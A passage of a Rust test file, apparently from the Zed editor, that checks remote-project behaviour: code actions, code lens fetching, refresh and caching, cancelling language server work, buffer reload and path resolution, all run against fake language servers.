                call_graph_panel::CallOrigin::NameMatch
            ),
        ],
        "the exact caller first, then what only the index found"
    );

    let outside = callers
        .iter()
        .find(|caller| caller.name == "outside")
        .cloned()
        .unwrap();
    let callers_of_outside = cx
        .update(|cx| {
            call_graph_panel::fetch_children(
                &project,
                &outside,
                call_graph_panel::CallDirection::Incoming,
                call_graph_panel::FetchOptions::default(),
                cx,
            )
        })
        .await
        .unwrap()
        .symbols;
    assert_eq!(
        callers_of_outside
            .iter()
            .map(|caller| (caller.name.to_string(), caller.origin))
            .collect::<Vec<_>>(),
        vec![("main".to_string(), call_graph_panel::CallOrigin::NameMatch)],
        "a function outside the project is expanded by the host's index"
    );
}

#[gpui::test]
async fn test_remote_code_action_resolve(cx: &mut TestAppContext, server_cx: &mut TestAppContext) {
    cx.update(|cx| {
        let settings_store = SettingsStore::test(cx);
        cx.set_global(settings_store);
        theme_settings::init(theme::LoadThemes::JustBase, cx);
        release_channel::init(semver::Version::new(0, 0, 0), cx);
        editor::init(cx);
    });

    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
                "src": {
                    "lib.rs": "fn one() -> usize { 1 }"
                }
            },
        }),
    )
    .await;

    let (project, headless) = init_test(&fs, cx, server_cx).await;

    let capabilities = lsp::ServerCapabilities {
        code_action_provider: Some(lsp::CodeActionProviderCapability::Options(
            lsp::CodeActionOptions {
                resolve_provider: Some(true),
                ..lsp::CodeActionOptions::default()
            },
        )),
        ..lsp::ServerCapabilities::default()
    };

    cx.update_entity(&project, |project, _| {
        project.languages().register_test_language(LanguageConfig {
            name: "Rust".into(),
            matcher: (LanguageMatcher {
                path_suffixes: vec!["rs".into()],
                ..Default::default()
            })
            .into(),
            ..Default::default()
        });
        project.languages().register_fake_lsp_adapter(
            "Rust",
            FakeLspAdapter {
                name: "rust-analyzer",
                capabilities: capabilities.clone(),
                ..FakeLspAdapter::default()
            },
        );
    });

    server_cx.update(|cx| {
        headless.read(cx).languages.register_fake_lsp_server(
            LanguageServerName("rust-analyzer".into()),
            capabilities,
            Some(Box::new(|fake_lsp| {
                fake_lsp.set_request_handler::<lsp::request::CodeActionRequest, _, _>(
                    |_, _| async move {
                        Ok(Some(vec![lsp::CodeActionOrCommand::CodeAction(
                            lsp::CodeAction {
                                title: "Use two".to_string(),
                                data: Some(serde_json::json!({ "id": "action" })),
                                ..lsp::CodeAction::default()
                            },
                        )]))
                    },
                );
                fake_lsp.set_request_handler::<lsp::request::CodeActionResolveRequest, _, _>(
                    |mut action, _| async move {
                        action.edit = Some(lsp::WorkspaceEdit {
                            changes: Some(
                                [(
                                    lsp::Uri::from_file_path(path!("/code/project1/src/lib.rs"))
                                        .unwrap(),
                                    vec![lsp::TextEdit::new(
                                        lsp::Range::new(
                                            lsp::Position::new(0, 3),
                                            lsp::Position::new(0, 6),
                                        ),
                                        "two".to_string(),
                                    )],
                                )]
                                .into_iter()
                                .collect(),
                            ),
                            ..lsp::WorkspaceEdit::default()
                        });
                        Ok(action)
                    },
                );
            })),
        );
    });

    cx.run_until_parked();

    let worktree_id = project
        .update(cx, |project, cx| {
            project.languages().add(rust_lang());
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap()
        .0
        .read_with(cx, |worktree, _| worktree.id());
    cx.run_until_parked();

    let (buffer, _handle) = project
        .update(cx, |project, cx| {
            project.open_buffer_with_lsp((worktree_id, rel_path("src/lib.rs")), cx)
        })
        .await
        .unwrap();
    cx.run_until_parked();

    let cx = cx.add_empty_window();
    let workspace = cx.new_window_entity(|window, cx| {
        workspace::Workspace::test_new(project.clone(), window, cx)
    });
    let editor = cx.new_window_entity(|window, cx| {
        Editor::for_buffer(buffer.clone(), Some(project.clone()), window, cx)
    });
    workspace.update_in(cx, |workspace, window, cx| {
        workspace.add_item_to_active_pane(Box::new(editor.clone()), None, true, window, cx);
    });
    cx.run_until_parked();

    editor.update_in(cx, |editor, window, cx| {
        editor.change_selections(SelectionEffects::default(), window, cx, |s| {
            s.select_ranges([Point::new(0, 0)..Point::new(0, 0)]);
        });
    });
    cx.executor()
        .advance_clock(editor::CODE_ACTIONS_DEBOUNCE_TIMEOUT * 2);
    cx.run_until_parked();

    editor.update_in(cx, |editor, window, cx| {
        editor.toggle_code_actions(
            &ToggleCodeActions {
                deployed_from: None,
                quick_launch: false,
            },
            window,
            cx,
        );
    });
    cx.run_until_parked();

    editor.update(cx, |editor, _| assert!(editor.context_menu_visible()));

    let confirm_action = editor
        .update_in(cx, |editor, window, cx| {
            Editor::confirm_code_action(editor, &ConfirmCodeAction { item_ix: Some(0) }, window, cx)
        })
        .unwrap();
    confirm_action.await.unwrap();

    buffer.read_with(cx, |buffer, _| {
        assert_eq!(buffer.text(), "fn two() -> usize { 1 }");
    });
}

#[gpui::test]
async fn test_remote_code_lens_fetch_after_lsp_starts(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
                "src": {
                    "lib.rs": "fn one() -> usize { 1 }"
                }
            },
        }),
    )
    .await;

    let (project, headless) = init_test(&fs, cx, server_cx).await;

    let capabilities = lsp::ServerCapabilities {
        code_lens_provider: Some(lsp::CodeLensOptions {
            resolve_provider: None,
        }),
        ..lsp::ServerCapabilities::default()
    };

    cx.update_entity(&project, |project, _| {
        project.languages().register_test_language(LanguageConfig {
            name: "Rust".into(),
            matcher: (LanguageMatcher {
                path_suffixes: vec!["rs".into()],
                ..Default::default()
            })
            .into(),
            ..Default::default()
        });
        project.languages().register_fake_lsp_adapter(
            "Rust",
            FakeLspAdapter {
                name: "rust-analyzer",
                capabilities: capabilities.clone(),
                ..FakeLspAdapter::default()
            },
        );
    });

    cx.run_until_parked();

    let worktree_id = project
        .update(cx, |project, cx| {
            project.languages().add(rust_lang());
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap()
        .0
        .read_with(cx, |worktree, _| worktree.id());
    cx.run_until_parked();

    let (buffer, _handle) = project
        .update(cx, |project, cx| {
            project.open_buffer_with_lsp((worktree_id, rel_path("src/lib.rs")), cx)
        })
        .await
        .unwrap();
    cx.run_until_parked();

    // Prime the code lens cache while no LSP server exists on the host.
    // This simulates the race where the editor fetches code lenses during
    // initial paint before the language server has started.
    let lsp_store = project.read_with(cx, |project, _| project.lsp_store());
    let initial_actions = lsp_store
        .update(cx, |lsp_store, cx| lsp_store.code_lens_actions(&buffer, cx))
        .await
        .unwrap();
    assert_eq!(
        initial_actions.map(|a| a.len()),
        Some(0),
        "Before any LSP starts, code lenses should be empty"
    );

    // Now register the LSP on the host. This triggers server startup and
    // buffer registration, propagating capabilities to the client.
    server_cx.update(|cx| {
        headless.read(cx).languages.register_fake_lsp_server(
            LanguageServerName("rust-analyzer".into()),
            capabilities,
            Some(Box::new(|fake_lsp| {
                fake_lsp.set_request_handler::<lsp::request::CodeLensRequest, _, _>(
                    |_, _| async move {
                        Ok(Some(vec![lsp::CodeLens {
                            range: lsp::Range::new(
                                lsp::Position::new(0, 0),
                                lsp::Position::new(0, 9),
                            ),
                            command: Some(lsp::Command {
                                title: "1 reference".to_string(),
                                command: "lens_cmd".to_string(),
                                arguments: None,
                            }),
                            data: None,
                        }]))
                    },
                );
            })),
        );
    });

    // Trigger re-evaluation of language servers for the already-open buffer.
    server_cx.update_entity(&headless, |headless, cx| {
        headless.lsp_store.update(cx, |lsp_store, cx| {
            lsp_store.restart_all_language_servers(cx);
        });
    });
    cx.run_until_parked();

    // A subsequent fetch must bypass the stale (empty) cache now that a
    // new server is available.
    let actions = lsp_store
        .update(cx, |lsp_store, cx| lsp_store.code_lens_actions(&buffer, cx))
        .await
        .unwrap();
    let actions = actions.expect("Should have code lens actions after LSP starts");
    assert_eq!(
        actions.len(),
        1,
        "Should have fetched one code lens from the newly started LSP"
    );
    assert_eq!(
        actions.values().next().unwrap().lsp_action.title(),
        "1 reference",
    );
}

#[gpui::test]
async fn test_remote_code_lens_refetch_after_refresh(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
                "src": {
                    "lib.rs": "fn one() -> usize { 1 }"
                }
            },
        }),
    )
    .await;

    let (project, headless) = init_test(&fs, cx, server_cx).await;

    let capabilities = lsp::ServerCapabilities {
        code_lens_provider: Some(lsp::CodeLensOptions {
            resolve_provider: None,
        }),
        ..lsp::ServerCapabilities::default()
    };

    cx.update_entity(&project, |project, _| {
        project.languages().register_test_language(LanguageConfig {
            name: "Rust".into(),
            matcher: Arc::new(LanguageMatcher {
                path_suffixes: vec!["rs".into()],
                ..LanguageMatcher::default()
            }),
            ..LanguageConfig::default()
        });
        project.languages().register_fake_lsp_adapter(
            "Rust",
            FakeLspAdapter {
                name: "rust-analyzer",
                capabilities: capabilities.clone(),
                ..FakeLspAdapter::default()
            },
        );
    });

    let lens_generation = Arc::new(AtomicUsize::new(0));
    let mut fake_lsp_servers = server_cx.update(|cx| {
        headless.read(cx).languages.register_fake_lsp_server(
            LanguageServerName("rust-analyzer".into()),
            capabilities,
            Some(Box::new({
                let lens_generation = lens_generation.clone();
                move |fake_lsp| {
                    let lens_generation = lens_generation.clone();
                    fake_lsp.set_request_handler::<lsp::request::CodeLensRequest, _, _>(
                        move |_, _| {
                            let generation = lens_generation.load(Ordering::Acquire);
                            async move {
                                Ok(Some(vec![lsp::CodeLens {
                                    range: lsp::Range::new(
                                        lsp::Position::new(0, 0),
                                        lsp::Position::new(0, 9),
                                    ),
                                    command: Some(lsp::Command {
                                        title: format!("{generation} references"),
                                        command: "lens_cmd".to_string(),
                                        arguments: None,
                                    }),
                                    data: None,
                                }]))
                            }
                        },
                    );
                }
            })),
        )
    });

    cx.run_until_parked();

    let worktree_id = project
        .update(cx, |project, cx| {
            project.languages().add(rust_lang());
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap()
        .0
        .read_with(cx, |worktree, _| worktree.id());
    cx.run_until_parked();

    let (buffer, _handle) = project
        .update(cx, |project, cx| {
            project.open_buffer_with_lsp((worktree_id, rel_path("src/lib.rs")), cx)
        })
        .await
        .unwrap();
    let fake_lsp = fake_lsp_servers.next().await.unwrap();
    cx.run_until_parked();

    let lsp_store = project.read_with(cx, |project, _| project.lsp_store());
    let actions = lsp_store
        .update(cx, |lsp_store, cx| lsp_store.code_lens_actions(&buffer, cx))
        .await
        .unwrap()
        .expect("Should have code lens actions after the initial fetch");
    assert_eq!(
        actions
            .values()
            .map(|action| action.lsp_action.title().to_owned())
            .collect::<Vec<_>>(),
        vec!["0 references".to_string()],
        "Expected the initial code lens data on the client",
    );

    lens_generation.store(1, Ordering::Release);
    fake_lsp
        .request::<lsp::request::CodeLensRefresh>((), DEFAULT_LSP_REQUEST_TIMEOUT)
        .await
        .into_response()
        .unwrap();
    cx.run_until_parked();

    let actions = lsp_store
        .update(cx, |lsp_store, cx| lsp_store.code_lens_actions(&buffer, cx))
        .await
        .unwrap()
        .expect("Should have code lens actions after the refresh");
    assert_eq!(
        actions
            .values()
            .map(|action| action.lsp_action.title().to_owned())
            .collect::<Vec<_>>(),
        vec!["1 references".to_string()],
        "Expected the client to re-fetch code lens data after the server-initiated refresh, without any buffer edits",
    );
}

#[gpui::test]
async fn test_remote_lsp_data_cache_converges_with_multiple_servers(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
                "src": {
                    "lib.rs": "fn one() -> usize { 1 }"
                }
            },
            "project2": {
                ".git": {},
                "src": {
                    "lib.rs": "fn two() -> usize { 2 }"
                }
            },
        }),
    )
    .await;

    let (project, headless) = init_test(&fs, cx, server_cx).await;

    let capabilities = lsp::ServerCapabilities {
        code_lens_provider: Some(lsp::CodeLensOptions {
            resolve_provider: None,
        }),
        ..lsp::ServerCapabilities::default()
    };

    cx.update_entity(&project, |project, _| {
        project.languages().register_test_language(LanguageConfig {
            name: "Rust".into(),
            matcher: Arc::new(LanguageMatcher {
                path_suffixes: vec!["rs".into()],
                ..LanguageMatcher::default()
            }),
            ..LanguageConfig::default()
        });
        project.languages().register_fake_lsp_adapter(
            "Rust",
            FakeLspAdapter {
                name: "rust-analyzer",
                capabilities: capabilities.clone(),
                ..FakeLspAdapter::default()
            },
        );
    });

    let queried_uris = Arc::new(std::sync::Mutex::new(Vec::new()));
    let mut fake_lsp_servers = server_cx.update(|cx| {
        headless.read(cx).languages.register_fake_lsp_server(
            LanguageServerName("rust-analyzer".into()),
            capabilities,
            Some(Box::new({
                let queried_uris = queried_uris.clone();
                move |fake_lsp| {
                    let queried_uris = queried_uris.clone();
                    fake_lsp.set_request_handler::<lsp::request::CodeLensRequest, _, _>(
                        move |params, _| {
                            queried_uris.lock().unwrap().push(params.text_document.uri);
                            async move {
                                Ok(Some(vec![lsp::CodeLens {
                                    range: lsp::Range::new(
                                        lsp::Position::new(0, 0),
                                        lsp::Position::new(0, 9),
                                    ),
                                    command: Some(lsp::Command {
                                        title: "the lens".to_string(),
                                        command: "lens_cmd".to_string(),
                                        arguments: None,
                                    }),
                                    data: None,
                                }]))
                            }
                        },
                    );
                }
            })),
        )
    });

    cx.run_until_parked();

    project.update(cx, |project, cx| {
        project.languages().add(rust_lang());
        cx.notify();
    });
    let mut buffers = Vec::new();
    let mut fake_lsps = Vec::new();
    for project_root in [path!("/code/project1"), path!("/code/project2")] {
        let worktree_id = project
            .update(cx, |project, cx| {
                project.find_or_create_worktree(project_root, true, cx)
            })
            .await
            .unwrap()
            .0
            .read_with(cx, |worktree, _| worktree.id());
        cx.run_until_parked();
        buffers.push(
            project
                .update(cx, |project, cx| {
                    project.open_buffer_with_lsp((worktree_id, rel_path("src/lib.rs")), cx)
                })
                .await
                .unwrap(),
        );
        fake_lsps.push(fake_lsp_servers.next().await.unwrap());
        cx.run_until_parked();
    }
    let (buffer_1, _handle_1) = &buffers[0];
    let queried_lib_1 = vec![lsp::Uri::from_file_path(path!("/code/project1/src/lib.rs")).unwrap()];

    let lsp_store = project.read_with(cx, |project, _| project.lsp_store());
    lsp_store
        .update(cx, |lsp_store, cx| {
            lsp_store.code_lens_actions(buffer_1, cx)
        })
        .await
        .unwrap();
    assert_eq!(
        *queried_uris.lock().unwrap(),
        queried_lib_1,
        "Expected the initial fetch to query the buffer's own language server only",
    );

    lsp_store
        .update(cx, |lsp_store, cx| {
            lsp_store.code_lens_actions(buffer_1, cx)
        })
        .await
        .unwrap();
    assert_eq!(
        *queried_uris.lock().unwrap(),
        queried_lib_1,
        "Expected a repeated fetch to be served from the cache, despite the other worktree's server \
        never answering for this buffer",
    );

    let (buffer_1, _) = &buffers[0];
    buffer_1.update(cx, |buffer, cx| buffer.set_language(None, cx));
    cx.run_until_parked();
    let actions = lsp_store
        .update(cx, |lsp_store, cx| {
            lsp_store.code_lens_actions(buffer_1, cx)
        })
        .await
        .unwrap()
        .expect("Should have code lens actions cached");
    assert_eq!(
        actions
            .values()
            .map(|action| action.lsp_action.title().to_owned())
            .collect::<Vec<_>>(),
        vec!["the lens".to_string()],
        "Expected the cached data to survive an empty relevant server set (buffer without a language)",
    );
    assert_eq!(
        *queried_uris.lock().unwrap(),
        queried_lib_1,
        "Expected no new queries for the buffer without a language",
    );
}

#[gpui::test]
async fn test_remote_per_server_refresh_queries_only_the_refreshed_server(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
                "src": {
                    "lib.fake": "fn one() -> usize { 1 }"
                }
            },
        }),
    )
    .await;

    let (project, headless) = init_test(&fs, cx, server_cx).await;

    let capabilities = lsp::ServerCapabilities {
        code_lens_provider: Some(lsp::CodeLensOptions {
            resolve_provider: None,
        }),
        ..lsp::ServerCapabilities::default()
    };

    // Both the client and the headless registries need the language and the adapters:
    // the client filters relevant servers by adapter names, while the headless one
    // detects the buffer's language and starts the servers.
    let fake_language_config = || LanguageConfig {
        name: "Fake".into(),
        matcher: Arc::new(LanguageMatcher {
            path_suffixes: vec!["fake".into()],
            ..LanguageMatcher::default()
        }),
        ..LanguageConfig::default()
    };
    let fake_adapter =
        |server_name: &'static str, capabilities: &lsp::ServerCapabilities| FakeLspAdapter {
            name: server_name,
            capabilities: capabilities.clone(),
            ..FakeLspAdapter::default()
        };
    cx.update_entity(&project, |project, _| {
        project
            .languages()
            .register_test_language(fake_language_config());
        for server_name in ["server-a", "server-b"] {
            project
                .languages()
                .register_fake_lsp_adapter("Fake", fake_adapter(server_name, &capabilities));
        }
    });

    let request_counter = |fake_lsp: &mut lsp::FakeLanguageServer, counter: &Arc<AtomicUsize>| {
        let counter = counter.clone();
        fake_lsp.set_request_handler::<lsp::request::CodeLensRequest, _, _>(move |_, _| {
            counter.fetch_add(1, Ordering::Release);
            async move { Ok(Some(Vec::new())) }
        });
    };
    let lens_requests_a = Arc::new(AtomicUsize::new(0));
    let lens_requests_b = Arc::new(AtomicUsize::new(0));
    let (mut fake_lsp_servers_a, mut fake_lsp_servers_b) = server_cx.update(|cx| {
        let languages = &headless.read(cx).languages;
        languages.register_test_language(fake_language_config());
        for server_name in ["server-a", "server-b"] {
            languages.register_fake_lsp_adapter("Fake", fake_adapter(server_name, &capabilities));
        }
        let fake_lsp_servers_a = languages.register_fake_lsp_server(
            LanguageServerName("server-a".into()),
            capabilities.clone(),
            Some(Box::new({
                let lens_requests_a = lens_requests_a.clone();
                move |fake_lsp| request_counter(fake_lsp, &lens_requests_a)
            })),
        );
        let fake_lsp_servers_b = languages.register_fake_lsp_server(
            LanguageServerName("server-b".into()),
            capabilities.clone(),
            Some(Box::new({
                let lens_requests_b = lens_requests_b.clone();
                move |fake_lsp| request_counter(fake_lsp, &lens_requests_b)
            })),
        );
        (fake_lsp_servers_a, fake_lsp_servers_b)
    });

    cx.run_until_parked();

    let worktree_id = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap()
        .0
        .read_with(cx, |worktree, _| worktree.id());
    cx.run_until_parked();

    let (buffer, _handle) = project
        .update(cx, |project, cx| {
            project.open_buffer_with_lsp((worktree_id, rel_path("src/lib.fake")), cx)
        })
        .await
        .unwrap();
    let fake_lsp_a = fake_lsp_servers_a.next().await.unwrap();
    let _fake_lsp_b = fake_lsp_servers_b.next().await.unwrap();
    cx.run_until_parked();

    let lsp_store = project.read_with(cx, |project, _| project.lsp_store());
    lsp_store
        .update(cx, |lsp_store, cx| lsp_store.code_lens_actions(&buffer, cx))
        .await
        .unwrap();
    assert_eq!(
        (
            lens_requests_a.load(Ordering::Acquire),
            lens_requests_b.load(Ordering::Acquire),
        ),
        (1, 1),
        "Expected the initial fetch to query both servers",
    );

    fake_lsp_a
        .request::<lsp::request::CodeLensRefresh>((), DEFAULT_LSP_REQUEST_TIMEOUT)
        .await
        .into_response()
        .unwrap();
    cx.run_until_parked();

    lsp_store
        .update(cx, |lsp_store, cx| lsp_store.code_lens_actions(&buffer, cx))
        .await
        .unwrap();
    assert_eq!(
        (
            lens_requests_a.load(Ordering::Acquire),
            lens_requests_b.load(Ordering::Acquire),
        ),
        (2, 1),
        "Expected the refetch after a per-server refresh to query the refreshed server only",
    );
}

#[gpui::test]
async fn test_remote_code_lens_resolve(cx: &mut TestAppContext, server_cx: &mut TestAppContext) {
    cx.update(|cx| {
        let settings_store = SettingsStore::test(cx);
        cx.set_global(settings_store);
        theme_settings::init(theme::LoadThemes::JustBase, cx);
        release_channel::init(semver::Version::new(0, 0, 0), cx);
        editor::init(cx);
        SettingsStore::update_global(cx, |store, cx| {
            store.update_user_settings(cx, |settings| {
                settings.editor.code_lens = Some(settings::CodeLens::Menu);
            });
        });
    });

    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
                "src": {
                    "lib.rs": "fn one() -> usize { 1 }"
                }
            },
        }),
    )
    .await;

    let (project, headless) = init_test(&fs, cx, server_cx).await;

    let capabilities = lsp::ServerCapabilities {
        code_lens_provider: Some(lsp::CodeLensOptions {
            resolve_provider: Some(true),
        }),
        ..lsp::ServerCapabilities::default()
    };

    cx.update_entity(&project, |project, _| {
        project.languages().register_test_language(LanguageConfig {
            name: "Rust".into(),
            matcher: (LanguageMatcher {
                path_suffixes: vec!["rs".into()],
                ..Default::default()
            })
            .into(),
            ..Default::default()
        });
        project.languages().register_fake_lsp_adapter(
            "Rust",
            FakeLspAdapter {
                name: "rust-analyzer",
                capabilities: capabilities.clone(),
                ..FakeLspAdapter::default()
            },
        );
    });

    server_cx.update(|cx| {
        headless.read(cx).languages.register_fake_lsp_server(
            LanguageServerName("rust-analyzer".into()),
            capabilities,
            Some(Box::new(|fake_lsp| {
                fake_lsp.set_request_handler::<lsp::request::CodeLensRequest, _, _>(
                    |_, _| async move {
                        Ok(Some(vec![lsp::CodeLens {
                            range: lsp::Range::new(
                                lsp::Position::new(0, 0),
                                lsp::Position::new(0, 9),
                            ),
                            command: None,
                            data: Some(serde_json::json!({ "id": "lens" })),
                        }]))
                    },
                );
                fake_lsp.set_request_handler::<lsp::request::CodeLensResolve, _, _>(
                    |lens, _| async move {
                        Ok(lsp::CodeLens {
                            command: Some(lsp::Command {
                                title: "1 reference".to_string(),
                                command: "noop".to_string(),
                                arguments: None,
                            }),
                            ..lens
                        })
                    },
                );
            })),
        );
    });

    cx.run_until_parked();

    let worktree_id = project
        .update(cx, |project, cx| {
            project.languages().add(rust_lang());
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap()
        .0
        .read_with(cx, |worktree, _| worktree.id());
    cx.run_until_parked();

    let (buffer, _handle) = project
        .update(cx, |project, cx| {
            project.open_buffer_with_lsp((worktree_id, rel_path("src/lib.rs")), cx)
        })
        .await
        .unwrap();
    cx.run_until_parked();

    let cx = cx.add_empty_window();
    let workspace = cx.new_window_entity(|window, cx| {
        workspace::Workspace::test_new(project.clone(), window, cx)
    });
    let editor = cx.new_window_entity(|window, cx| {
        Editor::for_buffer(buffer.clone(), Some(project.clone()), window, cx)
    });
    workspace.update_in(cx, |workspace, window, cx| {
        workspace.add_item_to_active_pane(Box::new(editor.clone()), None, true, window, cx);
    });

    editor.update_in(cx, |editor, window, cx| {
        editor.change_selections(SelectionEffects::default(), window, cx, |s| {
            s.select_ranges([Point::new(0, 0)..Point::new(0, 0)]);
        });
    });
    cx.executor()
        .advance_clock(editor::CODE_ACTIONS_DEBOUNCE_TIMEOUT * 2);
    cx.run_until_parked();

    editor.update_in(cx, |editor, window, cx| {
        editor.toggle_code_actions(
            &ToggleCodeActions {
                deployed_from: None,
                quick_launch: false,
            },
            window,
            cx,
        );
    });
    cx.run_until_parked();

    editor.update(cx, |editor, _| {
        assert!(editor.context_menu_visible());
        let menu = editor.context_menu().borrow();
        let actions_menu = match menu.as_ref() {
            Some(CodeContextMenu::CodeActions(m)) => m,
            _ => panic!("Expected code actions menu to be visible"),
        };
        let item = actions_menu
            .actions
            .get(0)
            .expect("Expected at least one item in menu");
        assert_eq!(item.label(), "1 reference");
    });
}

#[gpui::test]
async fn test_remote_cancel_language_server_work(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    cx.update(ProjectLaunchApprovals::approve_everything_for_tests);
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
                "README.md": "# project 1",
                "src": {
                    "lib.rs": "fn one() -> usize { 1 }"
                }
            },
        }),
    )
    .await;

    let (project, headless) = init_test(&fs, cx, server_cx).await;

    fs.insert_tree(
        path!("/code/project1/.zed"),
        json!({
            "settings.json": r#"
          {
            "languages": {"Rust":{"language_servers":["rust-analyzer"]}},
            "lsp": {
              "rust-analyzer": {
                "binary": {
                  "path": "~/.cargo/bin/rust-analyzer"
                }
              }
            }
          }"#
        }),
    )
    .await;

    cx.update_entity(&project, |project, _| {
        project.languages().register_test_language(LanguageConfig {
            name: "Rust".into(),
            matcher: (LanguageMatcher {
                path_suffixes: vec!["rs".into()],
                ..Default::default()
            })
            .into(),
            ..Default::default()
        });
        project.languages().register_fake_lsp_adapter(
            "Rust",
            FakeLspAdapter {
                name: "rust-analyzer",
                ..Default::default()
            },
        )
    });

    let mut fake_lsp = server_cx.update(|cx| {
        headless.read(cx).languages.register_fake_lsp_server(
            LanguageServerName("rust-analyzer".into()),
            Default::default(),
            None,
        )
    });

    cx.run_until_parked();

    let worktree_id = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap()
        .0
        .read_with(cx, |worktree, _| worktree.id());

    cx.run_until_parked();

    let (buffer, _handle) = project
        .update(cx, |project, cx| {
            project.open_buffer_with_lsp((worktree_id, rel_path("src/lib.rs")), cx)
        })
        .await
        .unwrap();

    cx.run_until_parked();

    let mut fake_lsp = fake_lsp.next().await.unwrap();

    // Cancelling all language server work for a given buffer
    {
        // Two operations, one cancellable and one not.
        fake_lsp
            .start_progress_with(
                "another-token",
                lsp::WorkDoneProgressBegin {
                    cancellable: Some(false),
                    ..Default::default()
                },
                DEFAULT_LSP_REQUEST_TIMEOUT,
            )
            .await;

        let progress_token = "the-progress-token";
        fake_lsp
            .start_progress_with(
                progress_token,
                lsp::WorkDoneProgressBegin {
                    cancellable: Some(true),
                    ..Default::default()
                },
                DEFAULT_LSP_REQUEST_TIMEOUT,
            )
            .await;

        cx.executor().run_until_parked();

        project.update(cx, |project, cx| {
            project.cancel_language_server_work_for_buffers([buffer.clone()], cx)
        });

        cx.executor().run_until_parked();

        // Verify the cancellation was received on the server side
        let cancel_notification = fake_lsp
            .receive_notification::<lsp::notification::WorkDoneProgressCancel>()
            .await;
        assert_eq!(
            cancel_notification.token,
            lsp::NumberOrString::String(progress_token.into())
        );
    }

    // Cancelling work by server_id and token
    {
        let server_id = fake_lsp.server.server_id();
        let progress_token = "the-progress-token";

        fake_lsp
            .start_progress_with(
                progress_token,
                lsp::WorkDoneProgressBegin {
                    cancellable: Some(true),
                    ..Default::default()
                },
                DEFAULT_LSP_REQUEST_TIMEOUT,
            )
            .await;

        cx.executor().run_until_parked();

        project.update(cx, |project, cx| {
            project.cancel_language_server_work(
                server_id,
                Some(ProgressToken::String(SharedString::from(progress_token))),
                cx,
            )
        });

        cx.executor().run_until_parked();

        // Verify the cancellation was received on the server side
        let cancel_notification = fake_lsp
            .receive_notification::<lsp::notification::WorkDoneProgressCancel>()
            .await;
        assert_eq!(
            cancel_notification.token,
            lsp::NumberOrString::String(progress_token.to_owned())
        );
    }
}

#[gpui::test]
async fn test_remote_reload(cx: &mut TestAppContext, server_cx: &mut TestAppContext) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
                "README.md": "# project 1",
                "src": {
                    "lib.rs": "fn one() -> usize { 1 }"
                }
            },
        }),
    )
    .await;

    let (project, _headless) = init_test(&fs, cx, server_cx).await;
    let (worktree, _) = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap();

    let worktree_id = cx.update(|cx| worktree.read(cx).id());

    let buffer = project
        .update(cx, |project, cx| {
            project.open_buffer((worktree_id, rel_path("src/lib.rs")), cx)
        })
        .await
        .unwrap();

    fs.save(
        &PathBuf::from(path!("/code/project1/src/lib.rs")),
        &("bangles".to_string().into()),
        LineEnding::Unix,
    )
    .await
    .unwrap();

    cx.run_until_parked();

    buffer.update(cx, |buffer, cx| {
        assert_eq!(buffer.text(), "bangles");
        buffer.edit([(0..0, "a")], None, cx);
    });

    fs.save(
        &PathBuf::from(path!("/code/project1/src/lib.rs")),
        &("bloop".to_string().into()),
        LineEnding::Unix,
    )
    .await
    .unwrap();

    cx.run_until_parked();
    cx.update(|cx| {
        assert!(buffer.read(cx).has_conflict());
    });

    project
        .update(cx, |project, cx| {
            project.reload_buffers([buffer.clone()].into_iter().collect(), false, cx)
        })
        .await
        .unwrap();
    cx.run_until_parked();

    cx.update(|cx| {
        assert!(!buffer.read(cx).has_conflict());
    });
}

#[gpui::test]
async fn test_remote_resolve_path_in_buffer(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let fs = FakeFs::new(server_cx.executor());
    // Even though we are not testing anything from project1, it is necessary to test if project2 is picking up correct worktree
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
                "README.md": "# project 1",
                "src": {
                    "lib.rs": "fn one() -> usize { 1 }"
                }
            },
            "project2": {
                ".git": {},
                "README.md": "# project 2",
                "src": {
                    "lib.rs": "fn two() -> usize { 2 }"
                }
            }
        }),
    )
    .await;

    let (project, _headless) = init_test(&fs, cx, server_cx).await;

    let _ = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap();

    let (worktree2, _) = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project2"), true, cx)
        })
        .await
        .unwrap();

    let worktree2_id = cx.update(|cx| worktree2.read(cx).id());

    cx.run_until_parked();

    let buffer2 = project
        .update(cx, |project, cx| {
            project.open_buffer((worktree2_id, rel_path("src/lib.rs")), cx)
        })
        .await
        .unwrap();

    let path = project
        .update(cx, |project, cx| {
            project.resolve_path_in_buffer(path!("/code/project2/README.md"), &buffer2, cx)
        })
